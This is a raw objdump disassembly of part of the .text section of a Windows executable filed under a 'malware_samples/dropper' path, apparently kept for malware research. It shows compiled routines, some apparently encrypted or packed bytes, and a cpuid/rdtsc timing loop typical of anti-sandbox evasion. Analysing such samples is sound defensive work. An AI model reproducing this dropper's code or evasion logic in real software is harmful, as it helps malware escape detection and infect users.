
malware_samples/dropper/ded9bc18330405a482073e7290d5b4ab8cdf912d611fbb269a8f8d48061a095b.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 83 ec 28          	sub    $0x28,%rsp
   140001004:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001009:	c6 44 24 30 25       	movb   $0x25,0x30(%rsp)
   14000100e:	26 24 36             	es and $0x36,%al
   140001011:	40 3d 2a fe 18 08    	rex cmp $0x818fe2a,%eax
   140001017:	2c f6                	sub    $0xf6,%al
   140001019:	45 de fe             	rex.RB fdivrp %st,%st(6)
   14000101c:	fe                   	(bad)
   14000101d:	92                   	xchg   %eax,%edx
   14000101e:	9f                   	lahf
   14000101f:	9f                   	lahf
   140001020:	90                   	nop
   140001021:	84 90 d0 9c 8d 96    	test   %dl,-0x69726330(%rax)
   140001027:	fe                   	(bad)
   140001028:	fe cd                	dec    %ch
   14000102a:	dd fe                	(bad)
   14000102c:	fe cc                	dec    %ah
   14000102e:	ca c8 d0             	lret   $0xd0c8
   140001031:	cc                   	int3
   140001032:	cd fe                	int    $0xfe
   140001034:	fe 00                	incb   (%rax)
   140001036:	48 8d 05 5b 51 06 00 	lea    0x6515b(%rip),%rax        # 0x140066198
   14000103d:	48 89 05 54 30 08 00 	mov    %rax,0x83054(%rip)        # 0x140084098
   140001044:	48 83 c4 28          	add    $0x28,%rsp
   140001048:	c3                   	ret
   140001049:	cc                   	int3
   14000104a:	cc                   	int3
   14000104b:	cc                   	int3
   14000104c:	cc                   	int3
   14000104d:	cc                   	int3
   14000104e:	cc                   	int3
   14000104f:	cc                   	int3
   140001050:	48 8d 0d e9 1e 06 00 	lea    0x61ee9(%rip),%rcx        # 0x140062f40
   140001057:	e9 d4 b7 03 00       	jmp    0x14003c830
   14000105c:	cc                   	int3
   14000105d:	cc                   	int3
   14000105e:	cc                   	int3
   14000105f:	cc                   	int3
   140001060:	48 8d 0d e9 1e 06 00 	lea    0x61ee9(%rip),%rcx        # 0x140062f50
   140001067:	e9 c4 b7 03 00       	jmp    0x14003c830
   14000106c:	cc                   	int3
   14000106d:	cc                   	int3
   14000106e:	cc                   	int3
   14000106f:	cc                   	int3
   140001070:	40 53                	rex push %rbx
   140001072:	48 83 55 48 89       	adcq   $0xffffffffffffff89,0x48(%rbp)
   140001077:	e5 48                	in     $0x48,%eax
   140001079:	83 ec 08             	sub    $0x8,%esp
   14000107c:	41 81 f0 6e 74 65 6c 	xor    $0x6c65746e,%r8d
   140001083:	41 81 f0 6e 74 65 6c 	xor    $0x6c65746e,%r8d
   14000108a:	48 83 ec 10          	sub    $0x10,%rsp
   14000108e:	8b f0                	mov    %eax,%esi
   140001090:	45 33 db             	xor    %r11d,%r11d
   140001093:	48 83 c0 08          	add    $0x8,%rax
   140001097:	e8 19 00 00 00       	call   0x1400010b5
   14000109c:	48 85 c0             	test   %rax,%rax
   14000109f:	74 05                	je     0x1400010a6
   1400010a1:	e9 f4 02 00 00       	jmp    0x14000139a
   1400010a6:	49 ff ca             	dec    %r10
   1400010a9:	4d 33 db             	xor    %r11,%r11
   1400010ac:	48 ff c8             	dec    %rax
   1400010af:	48 83 c4 08          	add    $0x8,%rsp
   1400010b3:	5d                   	pop    %rbp
   1400010b4:	c3                   	ret
   1400010b5:	33 c0                	xor    %eax,%eax
   1400010b7:	90                   	nop
   1400010b8:	0f a2                	cpuid
   1400010ba:	90                   	nop
   1400010bb:	b8 01 00 00 00       	mov    $0x1,%eax
   1400010c0:	90                   	nop
   1400010c1:	0f a2                	cpuid
   1400010c3:	90                   	nop
   1400010c4:	49 b9 00 5e d0 b2 00 	movabs $0xb2d05e00,%r9
   1400010cb:	00 00 00 
   1400010ce:	90                   	nop
   1400010cf:	0f a2                	cpuid
   1400010d1:	90                   	nop
   1400010d2:	0f 31                	rdtsc
   1400010d4:	90                   	nop
   1400010d5:	48 c1 e2 20          	shl    $0x20,%rdx
   1400010d9:	90                   	nop
   1400010da:	48 0b c2             	or     %rdx,%rax
   1400010dd:	90                   	nop
   1400010de:	48 8b c8             	mov    %rax,%rcx
   1400010e1:	90                   	nop
   1400010e2:	d9 eb                	fldpi
   1400010e4:	90                   	nop
   1400010e5:	d9 fc                	frndint
   1400010e7:	90                   	nop
   1400010e8:	0f 31                	rdtsc
   1400010ea:	90                   	nop
   1400010eb:	48 c1 e2 20          	shl    $0x20,%rdx
   1400010ef:	90                   	nop
   1400010f0:	48 0b c2             	or     %rdx,%rax
   1400010f3:	90                   	nop
   1400010f4:	48 2b c1             	sub    %rcx,%rax
   1400010f7:	90                   	nop
   1400010f8:	49 3b c1             	cmp    %r9,%rax
   1400010fb:	90                   	nop
   1400010fc:	72 e4                	jb     0x1400010e2
   1400010fe:	90                   	nop
   1400010ff:	90                   	nop
   140001100:	55                   	push   %rbp
   140001101:	90                   	nop
   140001102:	48 8b ec             	mov    %rsp,%rbp
   140001105:	90                   	nop
   140001106:	48 83 ec 08          	sub    $0x8,%rsp
   14000110a:	90                   	nop
   14000110b:	49 c7 c2 0a 00 00 00 	mov    $0xa,%r10
   140001112:	90                   	nop
   140001113:	48 c7 c1 78 56 34 9f 	mov    $0xffffffff9f345678,%rcx
   14000111a:	90                   	nop
   14000111b:	48 ff c9             	dec    %rcx
   14000111e:	90                   	nop
   14000111f:	4d 33 c9             	xor    %r9,%r9
   140001122:	90                   	nop
   140001123:	48 8b c1             	mov    %rcx,%rax
   140001126:	90                   	nop
   140001127:	75 f2                	jne    0x14000111b
   140001129:	90                   	nop
   14000112a:	48 33 c0             	xor    %rax,%rax
   14000112d:	90                   	nop
   14000112e:	48 8b c3             	mov    %rbx,%rax
   140001131:	90                   	nop
   140001132:	48 03 c2             	add    %rdx,%rax
   140001135:	90                   	nop
   140001136:	49 ff ca             	dec    %r10
   140001139:	90                   	nop
   14000113a:	4d 33 db             	xor    %r11,%r11
   14000113d:	90                   	nop
   14000113e:	75 d2                	jne    0x140001112
   140001140:	90                   	nop
   140001141:	48 33 c0             	xor    %rax,%rax
   140001144:	48 c7 c0 0a 00 00 00 	mov    $0xa,%rax
   14000114b:	90                   	nop
   14000114c:	48 ff c8             	dec    %rax
   14000114f:	90                   	nop
   140001150:	48 83 c4 08          	add    $0x8,%rsp
   140001154:	5d                   	pop    %rbp
   140001155:	c3                   	ret
   140001156:	00 00                	add    %al,(%rax)
   140001158:	00 ff                	add    %bh,%bh
   14000115a:	c0 c6 44             	rol    $0x44,%dh
   14000115d:	24 28                	and    $0x28,%al
   14000115f:	01 41 89             	add    %eax,-0x77(%rcx)
   140001162:	81 8c 00 00 00 48 83 	orl    $0xc35b50c4,-0x7cb80000(%rax,%rax,1)
   140001169:	c4 50 5b c3 
   14000116d:	4d 8b c2             	mov    %r10,%r8
   140001170:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140001175:	49 8d 49 78          	lea    0x78(%r9),%rcx
   140001179:	e8 72 43 03 00       	call   0x1400354f0
   14000117e:	48 83 c4 50          	add    $0x50,%rsp
   140001182:	5b                   	pop    %rbx
   140001183:	c3                   	ret
   140001184:	cc                   	int3
   140001185:	cc                   	int3
   140001186:	cc                   	int3
   140001187:	cc                   	int3
   140001188:	cc                   	int3
   140001189:	cc                   	int3
   14000118a:	cc                   	int3
   14000118b:	cc                   	int3
   14000118c:	cc                   	int3
   14000118d:	cc                   	int3
   14000118e:	cc                   	int3
   14000118f:	cc                   	int3
   140001190:	40 53                	rex push %rbx
   140001192:	48 83 ec 50          	sub    $0x50,%rsp
   140001196:	48 8d 05 2b 3c 06 00 	lea    0x63c2b(%rip),%rax        # 0x140064dc8
   14000119d:	48 c7 44 24 38 0f 00 	movq   $0xf,0x38(%rsp)
   1400011a4:	00 00 
   1400011a6:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400011ab:	33 db                	xor    %ebx,%ebx
   1400011ad:	48 8d 05 9c 60 06 00 	lea    0x6609c(%rip),%rax        # 0x140067250
   1400011b4:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   1400011b9:	0f 10 4c 24 40       	movups 0x40(%rsp),%xmm1
   1400011be:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400011c3:	48 8b 05 66 4d 08 00 	mov    0x84d66(%rip),%rax        # 0x140085f30
   1400011ca:	0f 10 44 24 30       	movups 0x30(%rsp),%xmm0
   1400011cf:	0f 11 0d 92 4d 08 00 	movups %xmm1,0x84d92(%rip)        # 0x140085f68
   1400011d6:	0f 11 05 7b 4d 08 00 	movups %xmm0,0x84d7b(%rip)        # 0x140085f58
   1400011dd:	90                   	nop
   1400011de:	48 85 c0             	test   %rax,%rax
   1400011e1:	75 1a                	jne    0x1400011fd
   1400011e3:	4c 8d 05 56 3d 02 00 	lea    0x23d56(%rip),%r8        # 0x140024f40
   1400011ea:	48 8d 15 7f 3b 02 00 	lea    0x23b7f(%rip),%rdx        # 0x140024d70
   1400011f1:	48 8d 0d 38 4d 08 00 	lea    0x84d38(%rip),%rcx        # 0x140085f30
   1400011f8:	e8 f3 49 03 00       	call   0x140035bf0
   1400011fd:	4c 8b 0d 2c 4d 08 00 	mov    0x84d2c(%rip),%r9        # 0x140085f30
   140001204:	4c 8d 15 4d 4d 08 00 	lea    0x84d4d(%rip),%r10        # 0x140085f58
   14000120b:	49 8b 41 78          	mov    0x78(%r9),%rax
   14000120f:	49 39 81 80 00 00 00 	cmp    %rax,0x80(%r9)
   140001216:	75 75                	jne    0x14000128d
   140001218:	45 8b 81 8c 00 00 00 	mov    0x8c(%r9),%r8d
   14000121f:	4a 8d 14 c0          	lea    (%rax,%r8,8),%rdx
   140001223:	48 3b c2             	cmp    %rdx,%rax
   140001226:	74 3e                	je     0x140001266
   140001228:	48 8b 08             	mov    (%rax),%rcx
   14000122b:	49 3b ca             	cmp    %r10,%rcx
   14000122e:	74 2b                	je     0x14000125b
   140001230:	48 83 f9 fe          	cmp    $0xfffffffffffffffe,%rcx
   140001234:	48 0f 44 d8          	cmove  %rax,%rbx
   140001238:	48 83 c0 08          	add    $0x8,%rax
   14000123c:	48 3b c2             	cmp    %rdx,%rax
   14000123f:	75 e7                	jne    0x140001228
   140001241:	48 85 db             	test   %rbx,%rbx
   140001244:	74 20                	je     0x140001266
   140001246:	4c 89 13             	mov    %r10,(%rbx)
   140001249:	41 ff 89 90 00 00 00 	decl   0x90(%r9)
   140001250:	c6 44 24 28 01       	movb   $0x1,0x28(%rsp)
   140001255:	48 83 c4 50          	add    $0x50,%rsp
   140001259:	5b                   	pop    %rbx
   14000125a:	c3                   	ret
   14000125b:	c6 44 24 28 00       	movb   $0x0,0x28(%rsp)
   140001260:	48 83 c4 50          	add    $0x50,%rsp
   140001264:	5b                   	pop    %rbx
   140001265:	c3                   	ret
   140001266:	45 3b 81 88 00 00 00 	cmp    0x88(%r9),%r8d
   14000126d:	73 1e                	jae    0x14000128d
   14000126f:	4c 89 12             	mov    %r10,(%rdx)
   140001272:	41 8b 81 8c 00 00 00 	mov    0x8c(%r9),%eax
   140001279:	ff c0                	inc    %eax
   14000127b:	c6 44 24 28 01       	movb   $0x1,0x28(%rsp)
   140001280:	41 89 81 8c 00 00 00 	mov    %eax,0x8c(%r9)
   140001287:	48 83 c4 50          	add    $0x50,%rsp
   14000128b:	5b                   	pop    %rbx
   14000128c:	c3                   	ret
   14000128d:	4d 8b c2             	mov    %r10,%r8
   140001290:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140001295:	49 8d 49 78          	lea    0x78(%r9),%rcx
   140001299:	e8 52 42 03 00       	call   0x1400354f0
   14000129e:	48 83 c4 50          	add    $0x50,%rsp
   1400012a2:	5b                   	pop    %rbx
   1400012a3:	c3                   	ret
   1400012a4:	cc                   	int3
   1400012a5:	cc                   	int3
   1400012a6:	cc                   	int3
   1400012a7:	cc                   	int3
   1400012a8:	cc                   	int3
   1400012a9:	cc                   	int3
   1400012aa:	cc                   	int3
   1400012ab:	cc                   	int3
   1400012ac:	cc                   	int3
   1400012ad:	cc                   	int3
   1400012ae:	cc                   	int3
   1400012af:	cc                   	int3
   1400012b0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400012b5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400012ba:	57                   	push   %rdi
   1400012bb:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   1400012c2:	48 8d 05 5f 61 06 00 	lea    0x6615f(%rip),%rax        # 0x140067428
   1400012c9:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400012ce:	48 c7 44 24 38 1d 00 	movq   $0x1d,0x38(%rsp)
   1400012d5:	00 00 
   1400012d7:	48 8b 05 3a 4c 08 00 	mov    0x84c3a(%rip),%rax        # 0x140085f18
   1400012de:	90                   	nop
   1400012df:	48 85 c0             	test   %rax,%rax
   1400012e2:	75 1a                	jne    0x1400012fe
   1400012e4:	4c 8d 05 55 3d 02 00 	lea    0x23d55(%rip),%r8        # 0x140025040
   1400012eb:	48 8d 15 ae 3b 02 00 	lea    0x23bae(%rip),%rdx        # 0x140024ea0
   1400012f2:	48 8d 0d 1f 4c 08 00 	lea    0x84c1f(%rip),%rcx        # 0x140085f18
   1400012f9:	e8 f2 48 03 00       	call   0x140035bf0
   1400012fe:	48 8b 3d 13 4c 08 00 	mov    0x84c13(%rip),%rdi        # 0x140085f18
   140001305:	45 33 c0             	xor    %r8d,%r8d
   140001308:	33 d2                	xor    %edx,%edx
   14000130a:	48 8d 0d 7f 50 08 00 	lea    0x8507f(%rip),%rcx        # 0x140086390
   140001311:	e8 aa 22 02 00       	call   0x1400235c0
   140001316:	90                   	nop
   140001317:	33 db                	xor    %ebx,%ebx
   140001319:	8b cb                	mov    %ebx,%ecx
   14000131b:	48 89 1d ee 50 08 00 	mov    %rbx,0x850ee(%rip)        # 0x140086410
   140001322:	48 8d 05 3f 60 06 00 	lea    0x6603f(%rip),%rax        # 0x140067368
   140001329:	48 89 05 e8 50 08 00 	mov    %rax,0x850e8(%rip)        # 0x140086418
   140001330:	48 8d 05 49 60 06 00 	lea    0x66049(%rip),%rax        # 0x140067380
   140001337:	48 89 05 52 50 08 00 	mov    %rax,0x85052(%rip)        # 0x140086390
   14000133e:	48 8d 05 c3 5e 06 00 	lea    0x65ec3(%rip),%rax        # 0x140067208
   140001345:	48 89 05 d4 50 08 00 	mov    %rax,0x850d4(%rip)        # 0x140086420
   14000134c:	48 8d 05 f5 60 06 00 	lea    0x660f5(%rip),%rax        # 0x140067448
   140001353:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001358:	48 c7 44 24 28 0b 00 	movq   $0xb,0x28(%rsp)
   14000135f:	00 00 
   140001361:	0f b7 05 32 50 08 00 	movzwl 0x85032(%rip),%eax        # 0x14008639a
   140001368:	be 00 40 00 00       	mov    $0x4000,%esi
   14000136d:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   140001372:	66 85 c6             	test   %ax,%si
   140001375:	74 58                	je     0x1400013cf
   140001377:	66 0f 7f 44 24 50    	movdqa %xmm0,0x50(%rsp)
   14000137d:	48 8b 05 ac 4b 08 00 	mov    0x84bac(%rip),%rax        # 0x140085f30
   140001384:	90                   	nop
   140001385:	48 85 c0             	test   %rax,%rax
   140001388:	75 1a                	jne    0x1400013a4
   14000138a:	4c 8d 05 af 3b 02 00 	lea    0x23baf(%rip),%r8        # 0x140024f40
   140001391:	48 8d 15 d8 39 02 00 	lea    0x239d8(%rip),%rdx        # 0x140024d70
   140001398:	48 8d 48 c7          	lea    -0x39(%rax),%rcx
   14000139c:	c1 be a1 60 1a e9 ee 	sarl   $0xee,-0x16e59f5f(%rsi)
   1400013a3:	10 00                	adc    %al,(%rax)
   1400013a5:	00 0d 85 4b 08 00    	add    %cl,0x84b85(%rip)        # 0x140085f30
   1400013ab:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   1400013b0:	48 8d 15 d9 4f 08 00 	lea    0x84fd9(%rip),%rdx        # 0x140086390
   1400013b7:	e8 c4 6e 02 00       	call   0x140028280
   1400013bc:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   1400013c1:	48 8b 0d 48 50 08 00 	mov    0x85048(%rip),%rcx        # 0x140086410
   1400013c8:	0f b7 05 cb 4f 08 00 	movzwl 0x84fcb(%rip),%eax        # 0x14008639a
   1400013cf:	0f 29 05 ca 4f 08 00 	movaps %xmm0,0x84fca(%rip)        # 0x1400863a0
   1400013d6:	0f 10 44 24 30       	movups 0x30(%rsp),%xmm0
   1400013db:	0f 29 05 ce 4f 08 00 	movaps %xmm0,0x84fce(%rip)        # 0x1400863b0
   1400013e2:	48 85 c9             	test   %rcx,%rcx
   1400013e5:	74 47                	je     0x14000142e
   1400013e7:	66 c7 84 24 80 00 00 	movw   $0x103,0x80(%rsp)
   1400013ee:	00 03 01 
   1400013f1:	48 8d 05 40 5d 06 00 	lea    0x65d40(%rip),%rax        # 0x140067138
   1400013f8:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   1400013fd:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140001402:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   140001407:	e8 f4 52 03 00       	call   0x140036700
   14000140c:	4c 8b c8             	mov    %rax,%r9
   14000140f:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140001414:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140001419:	48 8d 0d 70 4f 08 00 	lea    0x84f70(%rip),%rcx        # 0x140086390
   140001420:	e8 4b 3f 02 00       	call   0x140025370
   140001425:	0f b7 05 6e 4f 08 00 	movzwl 0x84f6e(%rip),%eax        # 0x14008639a
   14000142c:	eb 0e                	jmp    0x14000143c
   14000142e:	48 8d 0d 7b 2d 08 00 	lea    0x82d7b(%rip),%rcx        # 0x1400841b0
   140001435:	48 89 0d d4 4f 08 00 	mov    %rcx,0x84fd4(%rip)        # 0x140086410
   14000143c:	b9 bf ff 00 00       	mov    $0xffbf,%ecx
   140001441:	66 23 c1             	and    %cx,%ax
   140001444:	66 83 c8 38          	or     $0x38,%ax
   140001448:	66 89 05 4b 4f 08 00 	mov    %ax,0x84f4b(%rip)        # 0x14008639a
   14000144f:	48 8d 05 5a 4c 08 00 	lea    0x84c5a(%rip),%rax        # 0x1400860b0
   140001456:	48 8b 0d 73 4f 08 00 	mov    0x84f73(%rip),%rcx        # 0x1400863d0
   14000145d:	48 8d 1d f4 4a 08 00 	lea    0x84af4(%rip),%rbx        # 0x140085f58
   140001464:	48 39 01             	cmp    %rax,(%rcx)
   140001467:	75 05                	jne    0x14000146e
   140001469:	48 89 19             	mov    %rbx,(%rcx)
   14000146c:	eb 61                	jmp    0x1400014cf
   14000146e:	44 8b 05 63 4f 08 00 	mov    0x84f63(%rip),%r8d        # 0x1400863d8
   140001475:	4a 8d 14 c1          	lea    (%rcx,%r8,8),%rdx
   140001479:	48 8b c1             	mov    %rcx,%rax
   14000147c:	48 3b ca             	cmp    %rdx,%rcx
   14000147f:	74 0e                	je     0x14000148f
   140001481:	48 39 18             	cmp    %rbx,(%rax)
   140001484:	74 49                	je     0x1400014cf
   140001486:	48 83 c0 08          	add    $0x8,%rax
   14000148a:	48 3b c2             	cmp    %rdx,%rax
   14000148d:	75 f2                	jne    0x140001481
   14000148f:	44 3b 05 46 4f 08 00 	cmp    0x84f46(%rip),%r8d        # 0x1400863dc
   140001496:	72 2a                	jb     0x1400014c2
   140001498:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   14000149e:	45 33 c0             	xor    %r8d,%r8d
   1400014a1:	48 8d 15 38 4f 08 00 	lea    0x84f38(%rip),%rdx        # 0x1400863e0
   1400014a8:	48 8d 0d 21 4f 08 00 	lea    0x84f21(%rip),%rcx        # 0x1400863d0
   1400014af:	e8 9c fc 01 00       	call   0x140021150
   1400014b4:	44 8b 05 1d 4f 08 00 	mov    0x84f1d(%rip),%r8d        # 0x1400863d8
   1400014bb:	48 8b 0d 0e 4f 08 00 	mov    0x84f0e(%rip),%rcx        # 0x1400863d0
   1400014c2:	41 8b c0             	mov    %r8d,%eax
   1400014c5:	48 89 1c c1          	mov    %rbx,(%rcx,%rax,8)
   1400014c9:	ff 05 09 4f 08 00    	incl   0x84f09(%rip)        # 0x1400863d8
   1400014cf:	4c 8b c7             	mov    %rdi,%r8
   1400014d2:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   1400014d7:	48 8d 0d 0a 4f 08 00 	lea    0x84f0a(%rip),%rcx        # 0x1400863e8
   1400014de:	e8 7d 42 02 00       	call   0x140025760
   1400014e3:	48 8b 05 46 4a 08 00 	mov    0x84a46(%rip),%rax        # 0x140085f30
   1400014ea:	90                   	nop
   1400014eb:	48 85 c0             	test   %rax,%rax
   1400014ee:	75 1a                	jne    0x14000150a
   1400014f0:	4c 8d 05 49 3a 02 00 	lea    0x23a49(%rip),%r8        # 0x140024f40
   1400014f7:	48 8d 15 72 38 02 00 	lea    0x23872(%rip),%rdx        # 0x140024d70
   1400014fe:	48 8d 0d 2b 4a 08 00 	lea    0x84a2b(%rip),%rcx        # 0x140085f30
   140001505:	e8 e6 46 03 00       	call   0x140035bf0
   14000150a:	48 8b 0d 1f 4a 08 00 	mov    0x84a1f(%rip),%rcx        # 0x140085f30
   140001511:	45 33 c0             	xor    %r8d,%r8d
   140001514:	48 8d 15 75 4e 08 00 	lea    0x84e75(%rip),%rdx        # 0x140086390
   14000151b:	e8 c0 36 02 00       	call   0x140024be0
   140001520:	66 09 35 73 4e 08 00 	or     %si,0x84e73(%rip)        # 0x14008639a
   140001527:	48 8d 0d 32 1a 06 00 	lea    0x61a32(%rip),%rcx        # 0x140062f60
   14000152e:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   140001535:	00 
   140001536:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   14000153a:	49 8b 73 18          	mov    0x18(%r11),%rsi
   14000153e:	49 8b e3             	mov    %r11,%rsp
   140001541:	5f                   	pop    %rdi
   140001542:	e9 e9 b2 03 00       	jmp    0x14003c830
   140001547:	cc                   	int3
   140001548:	cc                   	int3
   140001549:	cc                   	int3
   14000154a:	cc                   	int3
   14000154b:	cc                   	int3
   14000154c:	cc                   	int3
   14000154d:	cc                   	int3
   14000154e:	cc                   	int3
   14000154f:	cc                   	int3
   140001550:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001555:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000155a:	57                   	push   %rdi
   14000155b:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140001562:	48 8d 05 b7 5d 06 00 	lea    0x65db7(%rip),%rax        # 0x140067320
   140001569:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000156e:	48 c7 44 24 38 25 00 	movq   $0x25,0x38(%rsp)
   140001575:	00 00 
   140001577:	48 8b 05 9a 49 08 00 	mov    0x8499a(%rip),%rax        # 0x140085f18
   14000157e:	90                   	nop
   14000157f:	48 85 c0             	test   %rax,%rax
   140001582:	75 1a                	jne    0x14000159e
   140001584:	4c 8d 05 b5 3a 02 00 	lea    0x23ab5(%rip),%r8        # 0x140025040
   14000158b:	48 8d 15 0e 39 02 00 	lea    0x2390e(%rip),%rdx        # 0x140024ea0
   140001592:	48 8d 0d 7f 49 08 00 	lea    0x8497f(%rip),%rcx        # 0x140085f18
   140001599:	e8 52 46 03 00       	call   0x140035bf0
   14000159e:	48 8b 3d 73 49 08 00 	mov    0x84973(%rip),%rdi        # 0x140085f18
   1400015a5:	45 33 c0             	xor    %r8d,%r8d
   1400015a8:	33 d2                	xor    %edx,%edx
   1400015aa:	48 8d 0d 3f 4d 08 00 	lea    0x84d3f(%rip),%rcx        # 0x1400862f0
   1400015b1:	e8 0a 20 02 00       	call   0x1400235c0
   1400015b6:	90                   	nop
   1400015b7:	33 db                	xor    %ebx,%ebx
   1400015b9:	8b cb                	mov    %ebx,%ecx
   1400015bb:	48 89 1d ae 4d 08 00 	mov    %rbx,0x84dae(%rip)        # 0x140086370
   1400015c2:	48 8d 05 9f 5c 06 00 	lea    0x65c9f(%rip),%rax        # 0x140067268
   1400015c9:	48 89 05 a8 4d 08 00 	mov    %rax,0x84da8(%rip)        # 0x140086378
   1400015d0:	48 8d 05 a9 5c 06 00 	lea    0x65ca9(%rip),%rax        # 0x140067280
   1400015d7:	48 89 05 12 4d 08 00 	mov    %rax,0x84d12(%rip)        # 0x1400862f0
   1400015de:	48 8d 05 23 5c 06 00 	lea    0x65c23(%rip),%rax        # 0x140067208
   1400015e5:	48 89 05 94 4d 08 00 	mov    %rax,0x84d94(%rip)        # 0x140086380
   1400015ec:	48 8d 05 55 5d 06 00 	lea    0x65d55(%rip),%rax        # 0x140067348
   1400015f3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400015f8:	48 c7 44 24 28 10 00 	movq   $0x10,0x28(%rsp)
   1400015ff:	00 00 
   140001601:	0f b7 05 f2 4c 08 00 	movzwl 0x84cf2(%rip),%eax        # 0x1400862fa
   140001608:	be 00 40 00 00       	mov    $0x4000,%esi
   14000160d:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   140001612:	66 85 c6             	test   %ax,%si
   140001615:	74 58                	je     0x14000166f
   140001617:	66 0f 7f 44 24 50    	movdqa %xmm0,0x50(%rsp)
   14000161d:	48 8b 05 0c 49 08 00 	mov    0x8490c(%rip),%rax        # 0x140085f30
   140001624:	90                   	nop
   140001625:	48 85 c0             	test   %rax,%rax
   140001628:	75 1a                	jne    0x140001644
   14000162a:	4c 8d 05 0f 39 02 00 	lea    0x2390f(%rip),%r8        # 0x140024f40
   140001631:	48 8d 15 38 37 02 00 	lea    0x23738(%rip),%rdx        # 0x140024d70
   140001638:	48 8d 0d f1 48 08 00 	lea    0x848f1(%rip),%rcx        # 0x140085f30
   14000163f:	e8 ac 45 03 00       	call   0x140035bf0
   140001644:	48 8b 0d e5 48 08 00 	mov    0x848e5(%rip),%rcx        # 0x140085f30
   14000164b:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140001650:	48 8d 15 99 4c 08 00 	lea    0x84c99(%rip),%rdx        # 0x1400862f0
   140001657:	e8 24 6c 02 00       	call   0x140028280
   14000165c:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   140001661:	48 8b 0d 08 4d 08 00 	mov    0x84d08(%rip),%rcx        # 0x140086370
   140001668:	0f b7 05 8b 4c 08 00 	movzwl 0x84c8b(%rip),%eax        # 0x1400862fa
   14000166f:	0f 29 05 8a 4c 08 00 	movaps %xmm0,0x84c8a(%rip)        # 0x140086300
   140001676:	0f 10 44 24 30       	movups 0x30(%rsp),%xmm0
   14000167b:	0f 29 05 8e 4c 08 00 	movaps %xmm0,0x84c8e(%rip)        # 0x140086310
   140001682:	48 85 c9             	test   %rcx,%rcx
   140001685:	74 47                	je     0x1400016ce
   140001687:	66 c7 84 24 80 00 00 	movw   $0x103,0x80(%rsp)
   14000168e:	00 03 01 
   140001691:	48 8d 05 a0 5a 06 00 	lea    0x65aa0(%rip),%rax        # 0x140067138
   140001698:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   14000169d:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   1400016a2:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   1400016a7:	e8 54 50 03 00       	call   0x140036700
   1400016ac:	4c 8b c8             	mov    %rax,%r9
   1400016af:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   1400016b4:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   1400016b9:	48 8d 0d 30 4c 08 00 	lea    0x84c30(%rip),%rcx        # 0x1400862f0
   1400016c0:	e8 ab 3c 02 00       	call   0x140025370
   1400016c5:	0f b7 05 2e 4c 08 00 	movzwl 0x84c2e(%rip),%eax        # 0x1400862fa
   1400016cc:	eb 0e                	jmp    0x1400016dc
   1400016ce:	48 8d 0d 9b 2a 08 00 	lea    0x82a9b(%rip),%rcx        # 0x140084170
   1400016d5:	48 89 0d 94 4c 08 00 	mov    %rcx,0x84c94(%rip)        # 0x140086370
   1400016dc:	b9 bf ff 00 00       	mov    $0xffbf,%ecx
   1400016e1:	66 23 c1             	and    %cx,%ax
   1400016e4:	66 83 c8 38          	or     $0x38,%ax
   1400016e8:	66 89 05 0b 4c 08 00 	mov    %ax,0x84c0b(%rip)        # 0x1400862fa
   1400016ef:	48 8d 05 ba 49 08 00 	lea    0x849ba(%rip),%rax        # 0x1400860b0
   1400016f6:	48 8b 0d 33 4c 08 00 	mov    0x84c33(%rip),%rcx        # 0x140086330
   1400016fd:	48 8d 1d 54 48 08 00 	lea    0x84854(%rip),%rbx        # 0x140085f58
   140001704:	48 39 01             	cmp    %rax,(%rcx)
   140001707:	75 05                	jne    0x14000170e
   140001709:	48 89 19             	mov    %rbx,(%rcx)
   14000170c:	eb 61                	jmp    0x14000176f
   14000170e:	44 8b 05 23 4c 08 00 	mov    0x84c23(%rip),%r8d        # 0x140086338
   140001715:	4a 8d 14 c1          	lea    (%rcx,%r8,8),%rdx
   140001719:	48 8b c1             	mov    %rcx,%rax
   14000171c:	48 3b ca             	cmp    %rdx,%rcx
   14000171f:	74 0e                	je     0x14000172f
   140001721:	48 39 18             	cmp    %rbx,(%rax)
   140001724:	74 49                	je     0x14000176f
   140001726:	48 83 c0 08          	add    $0x8,%rax
   14000172a:	48 3b c2             	cmp    %rdx,%rax
   14000172d:	75 f2                	jne    0x140001721
   14000172f:	44 3b 05 06 4c 08 00 	cmp    0x84c06(%rip),%r8d        # 0x14008633c
   140001736:	72 2a                	jb     0x140001762
   140001738:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   14000173e:	45 33 c0             	xor    %r8d,%r8d
